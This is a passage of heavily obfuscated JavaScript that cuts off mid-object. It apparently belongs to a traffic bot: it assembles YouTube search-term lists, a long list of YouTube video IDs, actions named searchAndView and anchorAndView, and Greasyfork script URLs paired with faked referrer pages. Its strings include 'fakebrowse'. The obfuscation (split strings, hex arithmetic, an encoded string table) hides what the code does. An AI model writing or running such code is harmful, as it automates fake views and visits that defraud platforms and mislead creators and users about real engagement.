'\x20mrbeast\x20c' + 'rew,mrbeas' + 't\x20ex\x20emplo' + 'yees,mrbea' + 'st\x20ex-empl' + 'oyees,mrbe' + 'ast\x20live,m' + 'rbeast\x20hin' + 'di,mr.\x20bea' + 'st,mrbeast' + '\x20studio,mr' + 'beast\x20gami' + 'ng,sunnyv2' + '\x20mrbeast,m' + 'rbeast\x20sun' + 'nyv2,mrbea' + 'st\x20in\x20hind' + 'i,who\x20is\x20m' + 'r\x20beast,mr' + '\x20beast\x20hin' + 'di,mr\x20beas' + 't\x20react,wh' + 'at\x20happene' + 'd\x20to\x20mrbea' + 'st\x20ex\x20empl' + 'oyees,mr\x20b' + 'east\x20studi' + 'o,mr\x20beast' + '\x20gaming,mr' + 'beast\x20ware' + 'house,mr\x20b' + 'east\x20in\x20hi' + 'ndi,mr\x20bea' + 'st\x20podcast' + ',mister\x20be' + 'ast,mrbeas' + 't\x20last\x20to\x20' + 'leave')['split'](',')), searchTerms['push'](('minecraft,' + 'minecraft\x20' + 'hardcore,h' + 'ardcore\x20mi' + 'necraft,mi' + 'necraft\x20ch' + 'allenge,mi' + 'necraft\x20bu' + 't,minecraf' + 't\x20mod,mine' + 'craft\x20mods' + ',minecraft' + '\x20100\x20days,' + 'minecraft\x20' + 'funny,funn' + 'y\x20minecraf' + 't,minecraf' + 't\x20video,mi' + 'necraft\x20sc' + 'hool,100\x20d' + 'ays\x20minecr' + 'aft,minecr' + 'aft\x20animat' + 'ion,w\x20mine' + 'craft,mine' + 'craft\x20comp' + 'ilation,mi' + 'necraft\x20pe' + ',monster\x20s' + 'chool\x20mine' + 'craft,mine' + W(0xc) + 'ter\x20school' + ',to\x20be\x20con' + 'tinued\x20min' + 'ecraft,min' + 'ecraft\x20izl' + 'e,minecraf' + 't\x20story,mi' + 'necraft\x20mo' + 'vie,minecr' + 'aft\x20house,' + 'minecraft\x20' + 'fakir')[W(0x17)](',')), searchTerms['push'](['moomoo.io\x20' + 'zyenith']['repeatExte' + 'nd'](-0x12e8 + 0x1d83 + -0xa91)), searchTerms['push'](['moomoo.io\x20' + 'spyder']['repeatExte' + 'nd'](0x1839 + 0xda * 0x8 + -0x1eff)), searchTerms['push'](('bts,bts\x20v,' + 'jin\x20bts,bt' + 's\x20news,bts' + '\x20army,v\x20bt' + 's,rm\x20bts,b' + 'ts\x20rm,bts\x20' + 'jin,bts\x20sa' + 'd,sad\x20bts,' + 'bts\x20日本語,bt' + 's\x20韓国語,bts\x20' + '面白い,cctv\x20b' + 'ts,suga\x20bt' + 's,army\x20bts' + ',bts\x20live,' + 'kpop\x20bts,j' + 'imin\x20bts,j' + 'hope\x20bts,b' + 'ts\x20funny,b' + 'ts\x20日本語字幕,b' + 'ts\x20update,' + 'bts\x20future' + ',bts\x20eatin' + 'g,bts\x20stre' + 'ams,bts\x20日本' + '語字幕最新,taeh' + 'yung\x20bts,j' + 'ungkook\x20bt' + 's,bts\x20reac' + 'tion,bts\x20s' + 'truggle,bt' + 's\x20marriage' + ',bts\x20jungk' + 'ook,bts\x20面白' + 'い\x20日本語字幕,bt' + 's\x20playlist' + ',bts\x20play\x20' + 'game,bts\x20n' + 'ew\x20video,b' + 'ts\x20news\x20to' + 'day,bts\x20in' + X(0x1))['split'](',')), searchTerms = searchTerms['flat'](-0x1895 + 0x7ac + 0x10ec);

function a() {
  const bn = [
    'WObAoMGAdCkmWQxdLvC',
    'terview',
    'etrOfKRdUN9DEW8',
    'W5KYWOpdT2CBBCkEW4NcQG',
    'W6qmW57dPdSmW7BcHXu',
    'rg/en/scri',
    'BwfW',
    'BM8Ty2fJAgu',
    't8oVW4KWWPOIpvfmW5G',
    'WRFcQh0vWPRcGeDqFSoy',
    'qhjEBSoYW5NdQmokWRhdTG',
    'ntent-deli',
    'y3jHzNqGBw9UCW',
    'AhjVBwuVmta4lG',
    'tm_source=',
    'lwrPzxaTAw8Tyq',
    'W5iHl8kcWQjSgSkrW5RdVa',
    'W73cPJTTaSoT',
    'DY55B3v0DwjLlG',
    'm8obitpcLq',
    'dan-perry/',
    'aa03CJzjWQ3cTWBcVW',
    'W41gW5VcGCkagI15W7hdLW',
    'C3bSAxq',
    'W6JcR8kqm1qMhgtcQIC',
    'fakebrowse',
    'W4ZdRmkCWRxdU2hdU31yta',
    '0cisZkywhg',
    'W6G8cSkgzNZcGCo0eCoO'
  ];
  a = function() {
    return bn;
  };
  return a();
}
const hookPlaylistPoints = [
    'eHpl-BjXo5' + '8',
    '-PgyODlV6V' + '8',
    'S9EkXX0QYD' + 'U',
    'WvcG1OKdHW' + 'o',
    'b6gOcEwtZ8' + 'U',
    'apdtzA0Dzf' + 'k',
    'YiukDwYv2K' + '4',
    'zK-6UH5R5X' + '8',
    'bIXqNjtsEf' + '4',
    '3l253rESkw' + 'Q',
    'u6RVZKcN9z' + 'Q',
    '6ImZdwpdwT' + 'A',
    '0qPB5ANSBK' + 'c',
    '92duH3cqn1' + 'M',
    'b5lKI78fw3' + 's',
    'zpCCPZfP8L' + 'I',
    'ES7oooakr-' + 'c',
    '2eWyJ8FBvQ' + '8',
    'O4-B3OFPDf' + 'Q',
    'JFcnGk0_u7' + 'o',
    'AP7d2Ghq6d' + 'U',
    'UizEAwrZAG' + 'I',
    '0FAi5-h8Hj' + '0',
    'CNqA6IYj17' + 'k',
    'tSiKyCpwnS' + 'Y',
    'OrglyeV5xP' + 'Y',
    'BXkB-g4eCc' + 's',
    'Y53CmmpbOJ' + 's',
    'sm5MLz_IrQ' + 'k',
    'EuciRU_Ska' + '0',
    'cCbDCTLyPc' + 'E',
    'Ox7Ng5T7bm' + 'c',
    'TXTaB-dQg-' + '0',
    '3jSWaWgr_A' + '0',
    'xT8nvuxCRB' + 'E',
    '3c4Ab9EmRg' + 'Y',
    '2kScgeNOpL' + '8',
    't22jhowMom' + 'c',
    'HbcDLgkmXL' + 's',
    'JsKZ41uTeg' + 'c',
    'dfU48FRgs0' + 'g',
    '3K9ILewnUk' + 'o',
    'QmKwnRiKhD' + 'k',
    'n3nVsWsL6I' + 'k',
    'noTs52D_Mw' + 'Y',
    'A0tDR4nTTK' + '0',
    '9eBwFca-B1' + '4',
    'moasU30H5l' + 'A',
    '_Mb8oQtSBW' + 'E',
    'TNGGOgwPtc' + 'M',
    '-pYA-gjkQ8' + 's',
    '5d-dB6tZZA' + 'o',
    '8H2AiOV0oE' + 'o',
    'mI7aiKDGde' + 'w',
    'D-IMDYrj35' + '4',
    'gKgFiEgghy' + 'g',
    'mjVwfjJ2nj' + 'k',
    '6auDBi-D2H' + 'M',
    'X89-SWNdIE' + 'k',
    'T5Pn4LhIwj' + 'M',
    'wVnKGSjY3i' + '8',
    'g11NJftxw1' + '4',
    '9zHirkfEKk' + 'k',
    'ZyGS_AMbIa' + '4',
    'yG6bwB17ZP' + 's',
    'aytHiLe0s6' + 'U',
    'cGe-Mpw_F1' + 'w',
    'eMK7xV_nxZ' + 'o',
    'epJ2MAKa1Y' + 'Q',
    '5BNbKKMUhE' + 'o',
    'oxpAvc6tDP' + '8',
    'jRcc-NIR2R' + 'I',
    '258btO4mFw' + '4',
    'pXjJAUvSbQ' + 'A',
    '63-irfPjh2' + 'c',
    'xbrDZAFf3Q' + 's',
    'MVHMtRlesU' + 'g',
    'zed05qfHMB' + 'I',
    'nkhkxKUHsY' + 'g',
    'n4cSAqR9H1' + 'Q',
    'gOUPndcj7z' + 'I',
    'n3HBTTDHoX' + '8',
    'XIgMFHPIXv' + '4',
    'oQHKMky-_K' + 'c',
    'zfDgTzZ2nh' + '0',
    '1PYettRo-D' + 'M',
    'jzuZuwF490' + '4',
    '2DAgWTlXae' + '8',
    'keouUYA5hI' + 'k',
    'F7i7wRlGCd' + 'c',
    'uToD2c0CdJ' + 'c',
    'Y8DzpdFZZ8' + '8',
    '-rrH657DAa' + 'o',
    'QTrEEWtDks' + '4',
    'TWTSnQDuad' + 'Y',
    'a0GUyvgnzg' + 'c',
    'eSReWZQyKd' + 'E',
    'D_5pMqdKSs' + '4',
    'm0ie8gHS00' + 'I',
    '6WosqMq9ej' + 'o',
    'i0afAOlon_' + '4',
    'j_fe6PfxW4' + 'Y',
    'GfPzi8SYr0' + 'w',
    'MSgZhNCwff' + 'M',
    'wxyBC_z6bI' + '8',
    'PkQpV-Fwhs' + 'k',
    'bVD6cWOVhN' + 'U',
    'mjZOpQlHbx' + 'M',
    'k_BXkcdbBO' + 'M',
    'X72oUsFV7q' + '0',
    'lONsILfq-W' + 'Y',
    'Bhe9PyM_s_' + 'Q',
    'Bhe9PyM_s_' + 'Q',
    'h4TBnDkX4y' + 'o',
    'PNBJyHEkfk' + '4',
    'L3iHS__ufc' + 'g',
    'm7aliUAwm_' + 'Y',
    'FuPVf85zMi' + 'w',
    'gtupAeNTDS' + 'M',
    'yyJ8zkckoB' + '8',
    'ZDTESiN1eS' + 'w',
    'Fo6x16DkoR' + 'o',
    'IAJqRxhVqO' + 'k',
    'KAgwII8TGj' + 'o',
    'o4tLCshmlb' + 'M',
    'dLj5fIupdA' + 'o',
    '_Xl_-b9P4U' + 'Q',
    'V3NxxpUUfW' + 'E',
    'J3ygeDEMnO' + 'w',
    'HcP_xmdwsl' + 'c',
    'M9g0h7px2_' + 'M',
    'b5WfUvcSgr' + 'U',
    'JGHnIshsoC' + 'E',
    'x2gfhCLHd9' + '4',
    'M5Fr8G0ma9' + 'o',
    '3sGeIBfFlC' + 'M',
    'k74y4KOJ2m' + '4',
    'pTHJB0S8E-' + 'U',
    'KaIrXJLfYP' + 'M',
    X(0x1b) + 'Q',
    '0dVzItbl9E' + 'w',
    't0EqnhcSb1' + 's',
    'MuiXtvo1RY' + 'E',
    'Nj-3KC6knH' + 'w',
    'B19HbETNi5' + '8',
    'yKN_QkroH6' + 's',
    'U9ExFM1pji' + '0',
    'sONzDfjKhL' + '4',
    'n3Kj8zEfew' + 'U',
    'nXLGQ7QeoG' + 'Y',
    'OQFQiwiM-P' + 'Y',
    'UtPRpKRTtH' + 'U',
    'E56Myp0BzE' + 'E',
    '7DjOp_JM2Z' + 'w',
    'rNFLQFz_G1' + 'g',
    '1r2pKoVAdj' + 'M',
    'gm3eiv6UND' + 'M',
    'yOiROfjxzX' + 'o',
    'lt2AcxC_ap' + 'g',
    'bObEme2BDO' + 'E',
    '6Ut6HbJmW4' + 'w',
    'fUs0TtQQTo' + '0',
    '_phHS3FAgW' + 'Q',
    '1f8sU4l3dP' + '4',
    'HwTSLUd53K' + '8',
    'EpP2ymD_QG' + 'A',
    'TQ69QFqmbo' + 'I',
    'wA8BqUka_u' + '0',
    'bc8Ey-vuR5' + 'M',
    'PZ_uLi7ULl' + '0',
    'smu5FsnhwF' + '4',
    'dv1JluwoOb' + 'c',
    'nHotP0jbcv' + 'A',
    'iIjYNEmrVv' + 'M',
    'SeP-OZAiPb' + 'c',
    'v52PClvMFt' + 'k',
    '3loLqIPxTS' + '0',
    'jVu9mOzbSq' + 'U',
    '73SAN1vOrV' + 'k',
    'YLPxp4ntym' + 's',
    'YWXfelRk3b' + 'Q',
    'CsxlLMb6Uj' + 'o',
    'uafGOfwzpa' + 'Q',
    'XIr8qotHOI' + 'E',
    'EcoPCWC3Uh' + 'o',
    'AhOwyT8aIh' + 'g',
    't-Ox7lI5UH' + 's',
    'i08qNmssXe' + 'Q',
    'QrJIU09eD-' + 'g',
    'QvNNCQ-8Rp' + 'E',
    'k5gjnjDFAZ' + 's',
    'h_NQ3y1ek8' + 'U',
    'evPsJlNLy_' + '4',
    'qEPTydgwh4' + 's',
    Y(0x18, '8E@U') + 'E',
    'Lj1EcSMGey' + '0',
    'OE19r7MIMW' + 'Q',
    'u8E3p0Vy-P' + 'Y',
    'f4a5OPFQa7' + 'k',
    'XDo7Q7yUEt' + 'k',
    'Vw_9zw0qHI' + 'c',
    'KGT5nbDsI_' + '8',
    'E008Eql59M' + 'Q',
    'wSOFdefX47' + 'A',
    '2xcv7q3QhR' + 'E',
    'hgfvmcBkc0' + '4',
    '0wP7csnX7k' + '4',
    'Xo0R8WiRSb' + '4',
    '8zNp8EOpGd' + '4',
    'sWYhIJZmoS' + 'E',
    'YdG8U1W-bX' + '0',
    'QeDsoSNml-' + 'c',
    'xW5q77El0x' + '8',
    'ZF14issJFE' + 'Y',
    'TRglEGLLKX' + 'o',
    'UE0SXc5k1e' + 'g',
    '6VY65D8f3D' + 'Q',
    'Iwxuob4fA8' + 'Q',
    'M4elJHCUIi' + 's',
    'GY9WWhO504' + 'k',
    'eErUSxmLDw' + '8',
    'ITQfAfzLj3' + 'I',
    'vbDrCL2FuL' + 'g',
    'KyQ_sUgtbK' + 'U',
    'lbEJcipUp8' + 'I',
    '2SqCn2LreN' + 'g',
    '1i-G2TUn41' + '0',
    's0ru6uK7vi' + '8',
    'gOxiE5UAAD' + 'w',
    'lx1rOOjekc' + '8',
    '5VYN2zA-Si' + 'k',
    'q9rLWEAzoo' + 'k',
    '4KSm3IY7Xz' + 'g',
    'fMqRu_ON-D' + 'E',
    'GfvShU6Sy9' + 'A',
    'OHzOmi1b60' + 'Y',
    'D9oTUKT-_n' + 'A',
    '_BrT2PlUiw' + '0',
    'kuuI4LzKgm' + 'I',
    '78dymyg88r' + 'M',
    'mi0nGt2B-q' + 'o',
    'HaI7BjnwnO' + 'c',
    'xlAEOkIuy7' + 'Y',
    '3VmtckvTXl' + 'U',
    'ed7TWHKDr4' + 'E',
    '2LfTjyVtbf' + 'U',
    'STHlCkloyv' + 'E',
    '-BI_-6YnM6' + 'Y',
    'LSK_G1qCQw' + 'M',
    '4tzqIl6EKV' + 'k',
    '9DshU55EiV' + '8',
    'mBtaEI_6e8' + 's',
    '960lvuduwY' + 'w',
    'XWJH-6J5Ee' + 'g',
    'XLS4qmyCAX' + 'g',
    '8cJDYeRiLn' + 'k',
    'cCaIVrltHz' + 'w',
    '8X2fF4pgM0' + 'E',
    '6s8Xm4wylr' + '4',
    'eFceshvavn' + 'o',
    '2h4g7euqR-' + 'U',
    'ujiBqXnn92' + '8',
    'w9F2NST-9j' + 's',
    'w-oc7F5Mmy' + 'U',
    'UYrmqL3cOD' + 'U',
    '4QB59etj0I' + 'o',
    'MY9MTNgXcN' + 'o',
    'ISBmcKDS5C' + '8',
    'ogIb7A7tvW' + '0',
    '-L583IZF6s' + 'k',
    'NbeKQq29ZL' + '0',
    'SPplDxd74F' + 's',
    'MHGV8QmpAz' + 'k',
    'iWzezFWpU7' + 'A',
    'NNCQt1rXXE' + 'Y',
    'bcb_ZhJJK8' + 'g',
    '3KoZGQiY6N' + 'o',
    'aSaXQH8F1_' + 'A',
    'V5nMOhI62o' + 'w',
    'JvlPjRUdId' + '0',
    '2gQHuClLCb' + '0',
    '5e-qDy-uUJ' + 'E',
    'oE8vC0QEWU' + 'E',
    '7cQken99yu' + 'o',
    'pmzu080j7r' + 'I',
    'sVy9F4whP6' + 'o',
    'MJrkylk7iE' + 'c',
    'XYjsTxi6oE' + '8',
    'mKlMouB6tp' + '0',
    'o2yunZQley' + 'A',
    'oRryU9F9Lv' + 's',
    'uzzK-052H0' + 'c',
    'VSvA4rCe-4' + 'M',
    'XURH2u_0fM' + 'I',
    'yfpVL2g_tk' + 'o',
    'AuEEjQ8x9o' + 'w',
    'wWkviY8zBr' + 'c',
    'zt_eubHWhx' + 'c',
    'O_7_BGU3u_' + '0',
    'QFDKBxmOn3' + 'Y',
    'w6gccNWXXv' + 'g',
    'VdNJxbrqdX' + 's',
    'wbi5Dxebvn' + 'I',
    'XEFOREYrJg' + 'k',
    'I2rcRta7WJ' + '0',
    'OP5KGfXHX_' + 'A',
    'w2MUMbbwlm' + 'o',
    'X3bF0nd6kf' + 'w',
    'WDDAhASf9j' + 'w',
    'fRwcV8gjbc' + 'w',
    '7T63gaRThr' + '0',
    'zC8AWIwhbf' + 's',
    'JSkVE0n-ee' + 'o',
    'qiQA5pWWRt' + 'U',
    'QdXCjZtfXu' + 'c',
    'vlBji8TOax' + 'o',
    'pBx_5CbIcp' + 'o',
    'L1Oy5F6ZMO' + 'Q',
    'P0NjLaBed-' + 'E',
    'DR16C4-keB' + '0',
    'LGmpIpu9eD' + 'w',
    'rNkX_A4kBA' + 'Q',
    'QztVMjrEk4' + '0',
    'uOM6m6KL5d' + '4',
    'g-Aju8xrrO' + 'E',
    'DfkDbFk_x9' + '8',
    'Y4NLDaowD6' + 'I',
    'ALSZnqQTuJ' + 'o',
    'xUmB6BpZBE' + 'w',
    'SxNOcZ1s85' + '8',
    '-noeCjO416' + 'k',
    'taPJqXBI8V' + 'Y',
    'YxqbkMi1Is' + '4',
    'vnJTyve2r-' + '4',
    '44lRVYQ38E' + 'Q',
    'QOv1N1X5J-' + 'g',
    'jNjREs7ODT' + 'g',
    'U30ToJo3dd' + 'k',
    'rm7lNIIOQC' + 'Y',
    'mGU6sOPlYv' + 'c',
    '6pwxUXdt6T' + 'Q',
    '6MkJRee35a' + 'Q',
    'LVbf7U9WAI' + 'c',
    'gPbhFvEeJ3' + 'M',
    'LWXAxz0MiH' + 'A',
    'L0KQJqfwJJ' + 'Y',
    'GWr33_u0VK' + 'c',
    '4ud3ZPfWkH' + 's',
    'dxSrySC4XM' + 'c',
    'iIM2KZC69W' + '0',
    '8DuJ3BAwME' + 'o',
    'm3BAhe1wsl' + 'Y',
    '02U_3pAZxM' + '8',
    '0e7nidPa97' + 'g',
    'TixW__6Eer' + 'o',
    'q46W8MTRTC' + 'E',
    'Jdxp04Je1O' + 'w',
    'HfP4TO3gfN' + '0',
    '4dUJaeB0qL' + '8',
    'xnL-fRJ3RZ' + 'o',
    'yJbD0Df45u' + 'Q',
    '-pGw8RkSSB' + 'k',
    '7cy86Njsis' + 'M',
    'jbgqvxtauo' + '4',
    'N8M00JjSVI' + 'I',
    'MfR5q6Td3R' + 'c',
    'eHwcx94wcp' + 's',
    'olDgVFgAgP' + 'o',
    'eAAd5BmzXz' + 'M',
    'xgTjQ2sGXd' + '4',
    'ipny6JUbzw' + 's',
    'WOwQ0UxbRj' + '4',
    'h0PKFed2GB' + 's',
    'JxdOrgzq7Z' + '8',
    '-VgpSWWW-8' + 'w',
    '-ix4OizkAn' + 's',
    'd3CRE9y3YV' + 's',
    '4QZlfXxorJ' + 'o',
    'YlDpg8aCs5' + 'M',
    'Qe5WT22-AO' + '8',
    'b_rjBWmc1i' + 'Q',
    '9yjZpBq1XB' + 'E',
    'hPx-RiBKXt' + 'Q',
    'UMqLDhl8PX' + 'w',
    'DlJEt2KU33' + 'I',
    'BWeqoARup-' + 'Q',
    '2Dx76lD8Sc' + 'c',
    'j_nI6G3ZDi' + 'E',
    'zvcUYYN1sx' + 'w',
    'cWRkYo1S3L' + '4',
    'cWRkYo1S3L' + '4',
    'bxC_PN3SRv' + 'I',
    '94m93T_5JL' + 'M',
    'RBSHAH4iWU' + '8',
    'RBSHAH4iWU' + '8',
    'RBSHAH4iWU' + '8',
    'bo9fTeXvSi' + 'A',
    'z6LqXiAK-8' + '0',
    '5tbOspjJ5f' + '0',
    'twQ6kKjtBk' + 'Y',
    'Ig17K38Fy0' + 'Y',
    'ZdlrVDwn_a' + '4',
    'aCT4Lddunx' + 'g',
    'acAvMGQtln' + 'M',
    '8XkcbdSRdO' + '0',
    '0e3GPea1Ty' + 'g',
    'zxYjTTXc-J' + '8',
    '9bqk6ZUsKy' + 'A',
    'plSyrHqUh7' + '8',
    'HkvQywg_uZ' + 'A',
    'lADBHDg-Jt' + 'A',
    'I2O7blSSzp' + 'I',
    'kd2KEHvK-q' + '8',
    'CbUjuwhQPK' + 's',
    'fb7T1v_VHp' + 'E',
    'SpeSpA3e56' + 'A',
    'RQdxHi4_Pv' + 'c',
    'nx2-4l4s4N' + 'w',
    'tUTCq3iiw_' + '4',
    'VDa5iGiPgG' + 's',
    'S-sJp1FfG7' + 'Q',
    'Hm1YFszJWb' + 'Q'
  ],
  GlobalActions = [
    searchAndView,
    anchorAndView,
    frontScreenActions,
    keyWatch
  ],
  wait = f => new Promise(h => setTimeout(h, f)),
  scriptTargets = [{
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/457024' + '-surviv-io' + '-xclient-b' + 'eta',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/surviv.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/404065' + '-%E7%BD%91' + '%E9%A1%B5%' + 'E7%B2%BE%E' + '7%81%B5',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/51cto.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/22545-' + 'anti-bd-re' + 'direct',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/baidu' + '.com?page=' + '4'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/385' + '044-zhihu-' + 'anonymous-' + 'users',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/zhihu' + '.com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/302' + '36-zhihu-l' + 'ink-fix',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/zhihu' + '.com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/435948' + '-btb',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/baidu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430335' + '-wb-script',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/zhihu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430572' + '-beautify-' + 'the-baidu-' + 'homepage',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/zhihu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/410781' + W(0xf) + 'nti-afk-ti' + 'meout',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + Y(0x4, 'qjDH')
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/1196-v' + 'iew-youtub' + 'e-tags',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/21012-' + Y(0x15, 'I*7['),
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + X(0x5) + 'pts/20798-' + 'youtube-hi' + 'de-volume-' + 'control',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/9090-y' + 'outube-add' + '-video-id-' + 'text-field',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/20710-' + 'calm-down-' + 'youtube',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/39544-' + 'youtube-po' + 'lymer-disa' + 'ble',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/412698' + '-youtube-a' + 'uto-skip-a' + 'ds',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/413965' + '-youtube-l' + 'ike-dislik' + 'e-video-an' + 'd-skip-ad-' + 'keyboard-s' + 'hortcuts-f' + 'ork-from-n' + 'erevar009',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/39919-' + 'youtube-su' + 'ggested-vi' + 'deo-hider-' + 'for-youtub' + 'e-classic',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/414756' + '-requestho' + 'ok',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + Y(0x8, 'T2aP') + 'pts/414876' + '-live-chat' + '-mod-calib' + 'er',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/40462-' + 'youtube-no' + '-resume',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + X(0x5) + 'pts/40517-' + 'youtube-re' + 'sume',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/415706' + '-moomoo-io' + '-remove-co' + 'okie-prefe' + 'rences-tab',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405955' + '-web-secur' + 'ity',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/381682' + '-html5%E8%' + 'A7%86%E9%A' + '2%91%E6%92' + '%AD%E6%94%' + 'BE%E5%99%A' + '8%E5%A2%9E' + '%E5%BC%BA%' + 'E8%84%9A%E' + '6%9C%AC',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/429635' + '-always-on' + '-focus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/30310-' + 'removeads',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/455853' + '-%E7%BD%91' + '%E9%A1%B5%' + 'E8%AE%BF%E' + '9%97%AE%E5' + '%8A%A0%E9%' + '80%9F%E5%9' + '9%A8',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454941' + '-hcaptcha-' + 'captcha-so' + 'lver-by-no' + 'captchaai',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/baidu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/discord.' + 'com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/407994' + '-mope-io-a' + 'uto-dive-a' + 'uto-boost-' + 'see-people' + '-underwate' + 'r-see-invi' + 'sible-play' + 'ers-remove' + '-ads',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/mope.io'
    },
    {
